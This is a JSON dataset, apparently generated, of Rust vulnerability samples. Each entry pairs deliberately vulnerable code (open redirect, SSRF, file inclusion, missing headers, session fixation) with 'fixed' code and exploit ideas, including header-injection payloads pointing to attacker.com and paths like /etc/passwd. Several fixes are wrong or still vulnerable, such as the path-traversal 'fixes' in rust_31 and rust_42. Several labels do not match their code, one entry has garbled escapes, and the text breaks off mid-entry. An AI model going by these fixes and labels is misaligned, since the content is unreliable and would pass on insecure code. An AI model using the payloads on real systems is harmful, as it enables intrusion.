        "fixed_code": "use std::collections::HashMap;\nextern crate argon2_crate;\n\nstruct UserAuth {\n    users: HashMap<String, String>,\n}\n\nimpl UserAuth {\n    fn new() -> Self {\n        let mut auth = UserAuth { users: HashMap::new() };\n        let hashed_password = argon2_crate::argon2i_simple_hash(\"securepassword123\", \"salt\").unwrap();\n        auth.users.insert(\"admin\".to_string(), hashed_password);\n        auth\n    }\n\n    fn login(&self, username: &str, password: &str) -> bool {\n        if let Some(hashed_password) = self.users.get(username) {\n            return argon2_crate::argon2i_verify(password, hashed_password).unwrap_or(false);\n        }\n        false\n    }\n}\n\nfn main() {\n    let auth = UserAuth::new();\n    let user_input_username = \"admin\";\n    let user_input_password = std::env::var(\"PASSWORD\").unwrap_or_default();\n    if auth.login(user_input_username, &user_input_password) {\n        println!(\"Access granted!\");\n    } else {\n        println!(\"Access denied.\");\n    }\n}",
        "exploit_ways": [
            "An attacker could brute force the password since it is stored in plain text.",
            "If 'PASSWORD' environment variable is predictable or reused, an attacker could gain access.",
            "A social engineering attack to obtain the password through phishing can lead to unauthorized access."
        ]
    },
    "rust_25": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "use actix_web::{web, App, HttpResponse, HttpServer};\n\nasync fn index() -> HttpResponse {\n    HttpResponse::Ok().body(\"Hello world!\")\n}\n\n#[actix_web::main]\nasync fn main() -> std::io::Result<()> {\n    HttpServer::new(|| {\n        App::new()\n            .route(\"/\", web::get().to(index))\n    })\n    .bind(\"127.0.0.1:8080\")?\n    .run()\n    .await\n}",
        "cvss_score": 3.5,
        "fixed_code": "use actix_web::{web, App, HttpResponse, HttpServer};\n\nasync fn index() -> HttpResponse {\n    HttpResponse::Ok()\n        .insert_header((\"Content-Security-Policy\", \"default-src 'self'\"))\n        .insert_header((\"X-Content-Type-Options\", \"nosniff\"))\n        .insert_header((\"X-Frame-Options\", \"SAMEORIGIN\"))\n        .insert_header((\"X-XSS-Protection\", \"1; mode=block\"))\n        .body(\"Hello world!\")\n}\n\n#[actix_web::main]\nasync fn main() -> std::io::Result<()> {\n    HttpServer::new(|| {\n        App::new()\n            .route(\"/\", web::get().to(index))\n    })\n    .bind(\"127.0.0.1:8080\")?\n    .run()\n    .await\n}",
        "exploit_ways": [
            "Attackers can inject malicious scripts into the response body if user input is not sanitized, leading to XSS.",
            "Without Content Security Policy (CSP), an attacker could load unauthorized resources or execute code in the context of the web application.",
            "X-Frame-Options header missing allows clickjacking attacks by embedding the site in an iframe."
        ]
    },
    "rust_26": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "use std::env;\nuse std::process;\n\nfn main() {\n    let args: Vec<String> = env::args().collect();\n    if args.len() > 1 {\n        let url = &args[1];\n        println!(\"Redirecting to: {}\");\n        process::Command::new(\"xdg-open\").arg(url).spawn().unwrap();\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "use std::env;\nuse std::process;\n\nfn main() {\n    let args: Vec<String> = env::args().collect();\n    if args.len() > 1 {\n        let url = &args[1];\n        if is_safe_url(url) {\n            println!(\"Redirecting to: {}\");\n            process::Command::new(\"xdg-open\").arg(url).spawn().unwrap();\n        } else {\n            println!(\"Unsafe URL detected\");\n        }\n    }\n}\n\nfn is_safe_url(url: &str) -> bool {\n    let allowed_domains = [\"example.com\", \"safe.com\"];\n    url::Url::parse(url)\n        .map(|parsed_url| allowed_domains.contains(&parsed_url.domain().unwrap_or_default()))\n        .unwrap_or(false)\n}",
        "exploit_ways": [
            "An attacker can provide a malicious URL to redirect users to phishing sites or malware.",
            "Using a crafted URL with a protocol like 'file://' could expose local files on the user's machine.",
            "Injecting URLs that trigger downloads of harmful content directly from the command line."
        ]
    },
    "rust_27": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "use reqwest::blocking::get;\n\nstruct Fetcher {\n    url: String,\n}\n\nimpl Fetcher {\n    fn new(url: String) -> Self {\n        Fetcher { url }\n    }\n\n    fn fetch(&self) -> Result<String, reqwest::Error> {\n        let response = get(&self.url)?;\n        Ok(response.text()?)\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "use reqwest::blocking::get;\n\nstruct Fetcher {\n    url: String,\n}\n\nimpl Fetcher {\n    fn new(url: String) -> Self {\n        if !url.starts_with(\"http://example.com/\") {\n            panic!(\"Invalid URL\");\n        }\n        Fetcher { url }\n    }\n\n    fn fetch(&self) -> Result<String, reqwest::Error> {\n        let response = get(&self.url)?;\n        Ok(response.text()?)\n    }\n}",
        "exploit_ways": [
            "An attacker can use the Fetcher to request internal resources like http://127.0.0.1/secret.",
            "They might try accessing file protocols such as file:///etc/passwd through the URL parameter.",
            "Inputting a crafted URL pointing to an external server could lead to data exfiltration."
        ]
    },
    "rust_28": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "use actix_web::{web, App, HttpResponse, HttpServer};\n\nstruct VulnerableApp;\n\nimpl VulnerableApp {\n    async fn handle_request(&self) -> HttpResponse {\n        HttpResponse::Ok().body(\"Hello, world!\")\n    }\n}\n\n#[actix_web::main]\nasync fn main() -> std::io::Result<()> {\n    HttpServer::new(|| App::new()\n        .route(\"/\", web::get().to(VulnerableApp.handle_request)))\n        .bind(\"127.0.0.1:8080\")?\n        .run()\n        .await\n}",
        "cvss_score": 6.5,
        "fixed_code": "use actix_web::{web, App, HttpResponse, HttpServer};\n\nstruct SecureApp;\n\nimpl SecureApp {\n    async fn handle_request(&self) -> HttpResponse {\n        HttpResponse::Ok()\n            .insert_header((\"Content-Security-Policy\", \"default-src 'self'\"))\n            .insert_header((\"X-Frame-Options\", \"DENY\"))\n            .insert_header((\"X-XSS-Protection\", \"1; mode=block\"))\n            .insert_header((\"X-Content-Type-Options\", \"nosniff\"))\n            .body(\"Hello, world!\")\n    }\n}\n\n#[actix_web::main]\nasync fn main() -> std::io::Result<()> {\n    HttpServer::new(|| App::new()\n        .route(\"/\", web::get().to(SecureApp.handle_request)))\n        .bind(\"127.0.0.1:8080\")?\n        .run()\n        .await\n}",
        "exploit_ways": [
            "An attacker could perform clickjacking attacks due to the lack of X-Frame-Options header.",
            "Cross-site scripting (XSS) attacks might be possible because Content Security Policy is not set.",
            "Sensitive information could be exposed by MIME type sniffing since X-Content-Type-Options is missing."
        ]
    },
    "rust_29": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "use std::sync::{Arc, Mutex};\n\nfn unsafe_function(data: Arc<Mutex<String>>) {\n    let mut value = data.lock().unwrap();\n    *value += \"Some operation\";\n    drop(value);\n}",
        "cvss_score": 4.2,
        "fixed_code": "use std::sync::{Arc, Mutex};\n\nfn safe_function(data: Arc<Mutex<String>>) {\n    let mut value = data.lock().unwrap();\n    *value += \"Some operation\";\n    // drop(value) is not necessary as the lock guard will be dropped automatically when it goes out of scope\n}",
        "exploit_ways": [
            "An attacker could cause a race condition by rapidly calling the function, leading to inconsistent data states.",
            "If combined with other vulnerabilities, this race condition might allow unauthorized access or data corruption.",
            "In certain scenarios, it can lead to deadlocks if not properly managed in complex applications."
        ]
    },
    "rust_30": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "use actix_web::cookie::{Cookie, SameSite};\nuse actix_web::web;\nuse actix_web::HttpResponse;\n\nasync fn set_session_cookie(user_id: String) -> HttpResponse {\n    let cookie = Cookie::build(\"user_id\", user_id)\n        .path(\"\")\n        .same_site(SameSite::Strict)\n        .secure(true)\n        .http_only(true)\n        .finish();\n\n    HttpResponse::Ok()\n        .cookie(cookie)\n        .body(\"\")\n}",
        "cvss_score": 4.2,
        "fixed_code": "use actix_web::cookie::{Cookie, SameSite};\nuse actix_web::web;\nuse actix_web::HttpResponse;\nuse rand::Rng;\n\nasync fn set_session_cookie(user_id: String) -> HttpResponse {\n    let session_id: String = rand::thread_rng().sample_iter(&rand::distributions::Alphanumeric).take(30).map(char::from).collect();\n    let cookie = Cookie::build(\"session_id\", session_id)\n        .path(\"\")\n        .same_site(SameSite::Strict)\n        .secure(true)\n        .http_only(true)\n        .finish();\n\n    HttpResponse::Ok()\n        .cookie(cookie)\n        .body(\"\")\n}",
        "exploit_ways": [
            "An attacker could set a session cookie before the user logs in to hijack their session.",
            "If the attacker knows the fixed session ID, they can use it to impersonate the user without logging in.",
            "The vulnerability allows attackers to maintain control over sessions if users log in from compromised machines."
        ]
    },
    "rust_31": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "use std::fs;\nuse std::io;\n\nfn read_file(path: &str) -> io::Result<String> {\n    fs::read_to_string(path)\n}",
        "cvss_score": 5.3,
        "fixed_code": "use std::fs;\nuse std::io;\n\nfn read_file(base_dir: &str, file_name: &str) -> io::Result<String> {\n    let path = format!(\"{}/{}\", base_dir, file_name);\n    fs::read_to_string(path)\n}",
        "exploit_ways": [
            "An attacker can input a malicious path like \"/etc/passwd\" to read sensitive system files.",
            "Using \"../\" sequences in the path could navigate up the directory tree to access unintended files.",
            "Crafting a path with special characters or encoded sequences might bypass simple validation checks."
        ]
    },
    "rust_32": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "#[derive(Serialize)]\nstruct User {\n    name: String,\n    email: String,\n}\n\nfn main() {\n    let user = User {\n        name: String::from(\"Alice\"),\n        email: String::from(\"alice@example.com\"),\n    };\n    println!(\"User details: {{\\\"name\\\": \\\"{}\\\", \\\"email\\\": \\\"{}\\\"}}\", user.name, user.email);\n}",
        "cvss_score": 2.3,
        "fixed_code": "#[derive(Serialize)]\nstruct User {\n    name: String,\n    email: String,\n}\n\nfn main() {\n    let user = User {\n        name: String::from(\"Alice\"),\n        email: String::from(\"alice@example.com\"),\n    };\n    println!(\"User details: {{\\\"name\\\": \\\"{}\\\", \\\"email\\\": \\\"{}\\\"}}\", user.name, user.email);\n}\n\n// No actual clickjacking vulnerability in this code snippet; it's a simple struct and print statement.\n// Ensure your web applications set X-Frame-Options or Content-Security-Policy headers to prevent clickjacking.",
        "exploit_ways": [
            "If this struct were used in a web application without proper headers, an attacker could embed the site in an iframe to trick users into clicking unintended elements.",
            "An attacker could overlay malicious buttons over legitimate ones on a compromised website to hijack user interactions.",
            "Without X-Frame-Options or CSP frame-ancestors directive, a phishing attack could use this page within a crafted webpage to deceive users."
        ]
    },
    "rust_33": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "fn set_session_id(user_id: &str) -> String {\n    format!(\"session_{}\", user_id)\n}",
        "cvss_score": 3.5,
        "fixed_code": "use rand::Rng;\n\nfn set_session_id(user_id: &str) -> String {\n    let mut rng = rand::thread_rng();\n    let random_suffix: u64 = rng.gen();\n    format!(\"session_{}_{}\", user_id, random_suffix)\n}",
        "exploit_ways": [
            "An attacker could predict or guess the session ID by using a known user ID.",
            "By setting a specific session ID in cookies before logging in, an attacker can hijack the session if the server does not regenerate the session ID upon login.",
            "If the user ID is predictable (e.g., sequential numbers), an attacker can attempt to fixate sessions for multiple users."
        ]
    },
    "rust_34": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "use reqwest::blocking::get;\n\nstruct Fetcher {\n    url: String,\n}\n\nimpl Fetcher {\n    fn new(url: &str) -> Fetcher {\n        Fetcher { url: url.to_string() }\n    }\n\n    fn fetch(&self) -> Result<String, reqwest::Error> {\n        let response = get(&self.url)?;\n        response.text()\n    }\n}\n\nfn main() -> Result<(), Box<dyn std::error::Error>> {\n    let user_input = \"http://example.com\"; // Simulate user input\n    let fetcher = Fetcher::new(user_input);\n    println!(\"Fetched content: {}\", fetcher.fetch()?.trim());\n    Ok(())\n}",
        "cvss_score": 7.5,
        "fixed_code": "use reqwest::blocking::get;\n\nstruct Fetcher {\n    url: String,\n}\n\nimpl Fetcher {\n    fn new(url: &str) -> Fetcher {\n        let allowed_host = \"example.com\";\n        if !url.starts_with(&format!(\"http://{}/\", allowed_host)) && !url.starts_with(&format!(\"https://{}/\", allowed_host)) {\n            panic!(\"URL is not allowed\");\n        }\n        Fetcher { url: url.to_string() }\n    }\n\n    fn fetch(&self) -> Result<String, reqwest::Error> {\n        let response = get(&self.url)?;\n        response.text()\n    }\n}\n\nfn main() -> Result<(), Box<dyn std::error::Error>> {\n    let user_input = \"http://example.com\"; // Simulate user input\n    let fetcher = Fetcher::new(user_input);\n    println!(\"Fetched content: {}\", fetcher.fetch()?.trim());\n    Ok(())\n}",
        "exploit_ways": [
            "An attacker could use an internal IP address like 'http://127.0.0.1' to access internal services.",
            "Exploiting the vulnerability with a local file URL such as 'file:///etc/passwd' can lead to information disclosure.",
            "Crafting a request to 'http://malicious.com' could be used to exfiltrate data or perform other malicious actions."
        ]
    },
    "rust_35": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "pub struct Button {\n    pub label: String,\n    pub onclick: fn(),\n}\n\nimpl Button {\n    pub fn new(label: &str, onclick: fn()) -> Self {\n        Button {\n            label: label.to_string(),\n            onclick,\n        }\n    }\n\n    pub fn render(&self) {\n        println!(\"<button onclick=\\\"{}\\\">{}</button>\", self.onclick as *const (), self.label);\n    }\n}",
        "cvss_score": 3.0,
        "fixed_code": "pub struct Button {\n    pub label: String,\n}\n\nimpl Button {\n    pub fn new(label: &str) -> Self {\n        Button {\n            label: label.to_string(),\n        }\n    }\n\n    pub fn render(&self, onclick: &str) {\n        println!(\"<button onclick=\\\"{}\\\">{}</button>\", onclick, self.label);\n    }\n}",
        "exploit_ways": [
            "An attacker could inject malicious onclick handlers to perform unintended actions.",
            "Using the vulnerable render method, an attacker can redirect users to phishing sites when they click on buttons.",
            "Attackers can embed hidden buttons that execute harmful scripts without user knowledge."
        ]
    },
    "rust_37": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "use std::io::{self, Write};\n\nfn main() {\n    println!(\"Enter your name:\");\n    io::stdout().flush().unwrap();\n    let mut input = String::new();\n    io::stdin().read_line(&mut input).expect(\"Failed to read line\");\n    println!(\"Hello, {}!\", input);\n}",
        "cvss_score": 5.3,
        "fixed_code": "use std::io::{self, Write};\n\nfn main() {\n    println!(\"Enter your name:\");\n    io::stdout().flush().unwrap();\n    let mut input = String::new();\n    io::stdin().read_line(&mut input).expect(\"Failed to read line\");\n    let clean_input = input.trim().replace(|c: char| !c.is_alphanumeric(), \"\");\n    println!(\"Hello, {}!\", clean_input);\n}",
        "exploit_ways": [
            "An attacker could input a name with '\\r\\nSet-Cookie: session=malicious' to inject malicious cookies.",
            "They can use '\\r\\nContent-Length: 0\\r\\n\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\nContent-Length: 53\\r\\n\\r\\n<html><h1>XSS Attack</h1></html>' to inject a new response.",
            "Injecting '\\r\\nLocation: http://attacker.com' could redirect the user to an attacker-controlled site."
        ]
    },
    "rust_38": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "use warp::Filter;\n\n#[tokio::main]\nasync fn main() {\n    let routes = warp::path(\"hello\").map(|| \"Hello, World!\");\n    warp::serve(routes)\n        .run(([127, 0, 0, 1], 3030))\n        .await;\n}",
        "cvss_score": 6.5,
        "fixed_code": "use warp::Filter;\n\n#[tokio::main]\nasync fn main() {\n    let routes = warp::path(\"hello\").map(|| \"Hello, World!\");\n    let cors = warp::cors()\n        .allow_any_origin()\n        .allow_methods(vec![\"GET\", \"POST\"])\n        .allow_headers(vec![\"content-type\"]);\n\n    let with_security_headers = warp::filters::header::optional::<String>(\"x-custom-header\").and(routes)\n        .map(|_: Option<String>, response| {\n            (\n                warp::http::Response::builder()\n                    .header(\"Content-Security-Policy\", \"default-src 'self'\")\n                    .header(\"X-Frame-Options\", \"DENY\")\n                    .header(\"X-XSS-Protection\", \"1; mode=block\")\n                    .header(\"X-Content-Type-Options\", \"nosniff\")\n                    .header(\"Referrer-Policy\", \"strict-origin-when-cross-origin\")\n                    .body(response),\n            )\n        });\n\n    warp::serve(cors.and(with_security_headers))\n        .run(([127, 0, 0, 1], 3030))\n        .await;\n}",
        "exploit_ways": [
            "An attacker could perform a clickjacking attack because X-Frame-Options is not set.",
            "A Cross-Site Scripting (XSS) attack might be possible due to missing Content Security Policy headers.",
            "Attackers can sniff sensitive data over non-HTTPS connections as there's no HSTS header enforcing HTTPS."
        ]
    },
    "rust_39": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "use actix_web::{web, App, HttpResponse, HttpServer};\n\nasync fn index(_req: web::HttpRequest) -> HttpResponse {\n    HttpResponse::Ok().body(\"Hello world!\")\n}\n\n#[actix_web::main]\nasync fn main() -> std::io::Result<()> {\n    HttpServer::new(|| App::new().route(\"/\", web::get().to(index)))\n        .bind(\"127.0.0.1:8080\")?\n        .run()\n        .await\n}",
        "cvss_score": 4.3,
        "fixed_code": "use actix_web::{web, App, HttpResponse, HttpServer};\n\nasync fn index(_req: web::HttpRequest) -> HttpResponse {\n    HttpResponse::Ok()\n        .header(\"Content-Security-Policy\", \"default-src 'self'\")\n        .header(\"X-Content-Type-Options\", \"nosniff\")\n        .header(\"X-XSS-Protection\", \"1; mode=block\")\n        .header(\"Strict-Transport-Security\", \"max-age=31536000\")\n        .body(\"Hello world!\")\n}\n\n#[actix_web::main]\nasync fn main() -> std::io::Result<()> {\n    HttpServer::new(|| App::new().route(\"/\", web::get().to(index)))\n        .bind(\"127.0.0.1:8080\")?\n        .run()\n        .await\n}",
        "exploit_ways": [
            "An attacker could inject malicious scripts into the response if there's any user input reflected back, leading to Cross-Site Scripting (XSS).",
            "Without Content Security Policy headers, an attacker might be able to load insecure resources from external domains.",
            "Absence of X-Content-Type-Options and X-XSS-Protection headers leaves the application vulnerable to MIME type sniffing attacks and older browsers' XSS protections bypass."
        ]
    },
    "rust_40": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "use std::fs;\n\nfn read_file(path: &str) -> Result<String, std::io::Error> {\n    let content = fs::read_to_string(path)?;\n    Ok(content)\n}\n\nfn main() {\n    let path = \"secret.txt\";\n    match read_file(path) {\n        Ok(content) => println!(\"File content: {}\", content),\n        Err(e) => eprintln!(\"Error reading file: {}\", e),\n    }\n}",
        "cvss_score": 4.2,
        "fixed_code": "use std::fs;\n\nfn read_file(path: &str) -> Result<String, std::io::Error> {\n    if path != \"secret.txt\" {\n        return Err(std::io::Error::new(std::io::ErrorKind::Other, \"Access denied\"));\n    }\n    let content = fs::read_to_string(path)?;\n    Ok(content)\n}\n\nfn main() {\n    let path = \"secret.txt\";\n    match read_file(path) {\n        Ok(content) => println!(\"File content: {}\", content),\n        Err(e) => eprintln!(\"Error reading file: {}\", e),\n    }\n}",
        "exploit_ways": [
            "An attacker could specify a different path to access other sensitive files on the system.",
            "By exploiting this vulnerability, they might be able to read configuration files containing credentials.",
            "If the application logs errors, an attacker could use crafted inputs to cause error messages that disclose information about the file structure."
        ]
    },
    "rust_41": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "fn race_condition() {\n    let mut shared_data = 0;\n    let handle1 = std::thread::spawn(move || {\n        for _ in 0..1000 {\n            shared_data += 1;\n        }\n    });\n    let handle2 = std::thread::spawn(move || {\n        for _ in 0..1000 {\n            shared_data -= 1;\n        }\n    });\n    handle1.join().unwrap();\n    handle2.join().unwrap();\n}",
        "cvss_score": 5.3,
        "fixed_code": "use std::sync::{Arc, Mutex};\n\nfn race_condition() {\n    let shared_data = Arc::new(Mutex::new(0));\n    let handle1 = {\n        let shared_data = shared_data.clone();\n        std::thread::spawn(move || {\n            for _ in 0..1000 {\n                *shared_data.lock().unwrap() += 1;\n            }\n        })\n    };\n    let handle2 = {\n        let shared_data = shared_data.clone();\n        std::thread::spawn(move || {\n            for _ in 0..1000 {\n                *shared_data.lock().unwrap() -= 1;\n            }\n        })\n    };\n    handle1.join().unwrap();\n    handle2.join().unwrap();\n}",
        "exploit_ways": [
            "An attacker can cause the final shared_data value to be inconsistent due to unsynchronized access.",
            "In a real-world scenario, this could lead to data corruption or incorrect financial transactions if applied in that context.",
            "By carefully timing thread executions, an attacker might manipulate the outcome of operations depending on shared state."
        ]
    },
    "rust_42": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "struct FileReader {\n    file_path: String,\n}\n\nimpl FileReader {\n    fn read_file(&self) -> Result<String, std::io::Error> {\n        use std::fs;\n        fs::read_to_string(self.file_path.clone())\n    }\n}",
        "cvss_score": 4.3,
        "fixed_code": "struct FileReader {\n    base_directory: String,\n    relative_file_path: String,\n}\n\nimpl FileReader {\n    fn read_file(&self) -> Result<String, std::io::Error> {\n        use std::fs;\n        let full_path = format!(\"{}/{}\", self.base_directory, self.relative_file_path);\n        fs::read_to_string(full_path)\n    }\n}",
        "exploit_ways": [
            "An attacker could specify a file path like \"/etc/passwd\" to read sensitive system files.",
            "Could use relative paths such as \"../../secret.txt\" to navigate to files outside the intended directory.",
            "Malicious input like \"\\\\..\\\\flag.txt\" on Windows systems might bypass naive filtering."
        ]
    },
    "rust_43": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "use actix_web::\\{web, App, HttpResponse, HttpServer\\};\n\nasync fn redirect_handler(query: web::Query<HashMap<String, String>>) -> HttpResponse {\n    if let Some(url) = query.get(\"url\") {\n        HttpResponse::Found().header(\"Location\", url).finish()\n    } else {\n        HttpResponse::BadRequest().body(\"\")\n    }\n}\n\n\\[actix_web::main\\]\nasync fn main() -> std::io::Result<\\()> {\n    HttpServer::new(|| {\n        App::new()\n            .route(\"/redirect\", web::get().to(redirect_handler))\n    })\n    .bind(\"127.0.0.1:8080\")?\\n    .run()\\n    .await\n}",
        "cvss_score": 6.5,
        "fixed_code": "use actix_web::\\{web, App, HttpResponse, HttpServer\\};\nuse url::Url;\n\nfn is_valid_redirect(url: &str) -> bool {\n    let parsed_url = Url::parse(url);\n    matches!(parsed_url, Ok(u) if u.scheme() == \"http\" || u.scheme() == \"https\") && !url.contains(\"malicious.com\")\n}\n\nasync fn redirect_handler(query: web::Query<HashMap<String, String>>) -> HttpResponse {\n    if let Some(url) = query.get(\"url\") {\n        if is_valid_redirect(url) {\n            HttpResponse::Found().header(\"Location\", url).finish()\n        } else {\n            HttpResponse::BadRequest().body(\"\")\n        }\n    } else {\n        HttpResponse::BadRequest().body(\"\")\n    }\n}\n\n\\[actix_web::main\\]\nasync fn main() -> std::io::Result<\\()> {\n    HttpServer::new(|| {\n        App::new()\n            .route(\"/redirect\", web::get().to(redirect_handler))\n    })\n    .bind(\"127.0.0.1:8080\")?\\n    .run()\\n    .await\n}",
        "exploit_ways": [
            "An attacker can redirect users to a malicious website by providing a URL parameter like '?url=http://malicious.com'.",
            "By using the vulnerability, an attacker could redirect authenticated users to a phishing site that mimics the legitimate login page.",
            "The open redirection flaw allows attackers to craft URLs that can lead users to download malware from compromised sites."
        ]
    },
    "rust_44": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "use std::net::TcpListener;\nuse std::io::{Read, Write};\n\nfn handle_client(mut stream: std::net::TcpStream) {\n    let mut buffer = [0; 512];\n    stream.read(&mut buffer).unwrap();\n    let request = String::from_utf8_lossy(&buffer);\n    if let Some(redir) = request.split_whitespace().nth(1) {\n        if redir.contains(\"redirect=\") {\n            let url = &redir[9..];\n            let response = format!(\"HTTP/1.1 302 Found\\r\\nLocation: {}\\r\\n\\r\\n\", url);\n            stream.write(response.as_bytes()).unwrap();\n        }\n    }\n}\n\nfn main() {\n    let listener = TcpListener::bind(\"127.0.0.1:7878\").unwrap();\n    for stream in listener.incoming() {\n        handle_client(stream.unwrap());\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "use std::net::TcpListener;\nuse std::io::{Read, Write};\n\nfn is_safe_url(url: &str) -> bool {\n    url.starts_with(\"http://localhost\") || url.starts_with(\"https://example.com\")\n}\n\nfn handle_client(mut stream: std::net::TcpStream) {\n    let mut buffer = [0; 512];\n    stream.read(&mut buffer).unwrap();\n    let request = String::from_utf8_lossy(&buffer);\n    if let Some(redir) = request.split_whitespace().nth(1) {\n        if redir.contains(\"redirect=\") {\n            let url = &redir[9..];\n            if is_safe_url(url) {\n                let response = format!(\"HTTP/1.1 302 Found\\r\\nLocation: {}\\r\\n\\r\\n\", url);\n                stream.write(response.as_bytes()).unwrap();\n            } else {\n                let response = \"HTTP/1.1 400 Bad Request\\r\\n\\r\\nInvalid redirect URL\";\n                stream.write(response.as_bytes()).unwrap();\n            }\n        }\n    }\n}\n\nfn main() {\n    let listener = TcpListener::bind(\"127.0.0.1:7878\").unwrap();\n    for stream in listener.incoming() {\n        handle_client(stream.unwrap());\n    }\n}",
        "exploit_ways": [
            "An attacker can redirect users to a malicious site by providing an external URL.",
            "Could exploit the open redirect to bypass login screens or access restricted pages on legitimate sites.",
            "Redirect to phishing websites to steal user credentials."
        ]
    },
    "rust_45": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "use actix_web::{web, App, HttpResponse, HttpServer};\n\nasync fn index() -> HttpResponse {\n    HttpResponse::Ok().body(\"Hello World!\")\n}\n\n#[actix_web::main]\nasync fn main() -> std::io::Result<()> {\n    HttpServer::new(|| {\n        App::new()\n            .route(\"/\", web::get().to(index))\n    })\n    .bind(\"127.0.0.1:8080\")?\n    .run()\n    .await\n}",
        "cvss_score": 4.0,
        "fixed_code": "use actix_web::{web, App, HttpResponse, HttpServer};\nuse actix_web::http::header;\n\nasync fn index() -> HttpResponse {\n    HttpResponse::Ok()\n        .insert_header((header::CONTENT_SECURITY_POLICY, \"default-src 'self'\"))\n        .insert_header((header::X_FRAME_OPTIONS, header::HeaderValue::from_static(\"DENY\")))\n        .insert_header((header::X_CONTENT_TYPE_OPTIONS, header::HeaderValue::from_static(\"nosniff\")))\n        .insert_header((header::X_XSS_PROTECTION, header::HeaderValue::from_static(\"1; mode=block\")))\n        .body(\"Hello World!\")\n}\n\n#[actix_web::main]\nasync fn main() -> std::io::Result<()> {\n    HttpServer::new(|| {\n        App::new()\n            .route(\"/\", web::get().to(index))\n    })\n    .bind(\"127.0.0.1:8080\")?\n    .run()\n    .await\n}",
        "exploit_ways": [
            "An attacker could inject malicious scripts into the response to perform XSS attacks.",
            "Lack of Content Security Policy (CSP) allows loading resources from insecure origins.",
            "Absence of X-Frame-Options header makes the application vulnerable to clickjacking."
        ]
    },
    "rust_46": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "fn main() {\n    let mut buffer = String::new();\n    std::io::stdin().read_line(&mut buffer).expect(\"Failed to read line\");\n    if buffer.trim() == \"stop\" {\n        loop {}\n    }\n}",
        "cvss_score": 3.5,
        "fixed_code": "fn main() {\n    let mut buffer = String::new();\n    std::io::stdin().read_line(&mut buffer).expect(\"Failed to read line\");\n    if buffer.trim() == \"stop\" {\n        println!(\"Stopping...\");\n        return;\n    }\n}",
        "exploit_ways": [
            "An attacker can input 'stop' to cause the program to enter an infinite loop, freezing it.",
            "By repeatedly entering 'stop', they could exhaust system resources if multiple instances are run.",
            "If integrated into a larger service, this could disrupt user interactions by making parts of the application unresponsive."
        ]
    },
    "rust_47": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "use std::net::TcpListener;\n\nfn main() {\n    let listener = TcpListener::bind(\"127.0.0.1:7878\").unwrap();\n    for stream in listener.incoming() {\n        let _stream = stream.unwrap();\n        // Handle connection here without setting security headers\n    }\n}",
        "cvss_score": 5.4,
        "fixed_code": "use std::net::TcpListener;\nuse hyper::{Body, Request, Response, Server};\nuse hyper::service::{make_service_fn, service_fn};\nuse futures::future;\n\nasync fn handle_request(_req: Request<Body>) -> Result<Response<Body>, hyper::Error> {\n    let mut response = Response::new(Body::from(\"Hello, world!\"));\n    *response.headers_mut() = [\n        (hyper::header::CONTENT_TYPE, \"text/plain; charset=utf-8\".parse().unwrap()),\n        (\"X-Content-Type-Options\", \"nosniff\".parse().unwrap()),\n        (\"X-XSS-Protection\", \"1; mode=block\".parse().unwrap()),\n        (\"Strict-Transport-Security\", \"max-age=31536000; includeSubDomains\".parse().unwrap())\n    ].iter().cloned().collect();\n    Ok(response)\n}\n\n#[tokio::main]\nasync fn main() {\n    let addr = ([127, 0, 0, 1], 7878).into();\n    let make_svc = make_service_fn(|_conn| {\n        async { Ok::<_, hyper::Error>(service_fn(handle_request)) }\n    });\n\n    let server = Server::bind(&addr).serve(make_svc);\n\n    if let Err(e) = server.await {\n        eprintln!(\"server error: {}\", e);\n    }\n}",
        "exploit_ways": [
            "An attacker could perform Clickjacking attacks as X-Frame-Options is missing.",
            "The lack of Content Security Policy (CSP) allows for XSS attacks.",
            "Without proper security headers, the server might be vulnerable to MIME-sniffing attacks."
        ]
    },
    "rust_48": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "pub struct Redirector {\n    url: String,\n}\n\nimpl Redirector {\n    pub fn new(url: &str) -> Self {\n        Redirector { url: url.to_string() }\n    }\n\n    pub fn redirect(&self) {\n        println!(\"Redirecting to: {}\", self.url);\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "use url::Url;\npub struct Redirector {\n    url: String,\n}\n\nimpl Redirector {\n    pub fn new(url: &str) -> Self {\n        let parsed_url = Url::parse(url).expect(\"Invalid URL\");\n        if !parsed_url.domain().unwrap_or_default().ends_with(\"example.com\") {\n            panic!(\"URL must be within example.com\");\n        }\n        Redirector { url: url.to_string() }\n    }\n\n    pub fn redirect(&self) {\n        println!(\"Redirecting to: {}\", self.url);\n    }\n}",
        "exploit_ways": [
            "An attacker could provide a URL pointing to an external malicious site, e.g., http://malicious.com.",
            "Attackers might use crafted URLs to redirect users to phishing sites that look similar to legitimate ones, e.g., https://legitimate-looking.example.org.evil.com.",
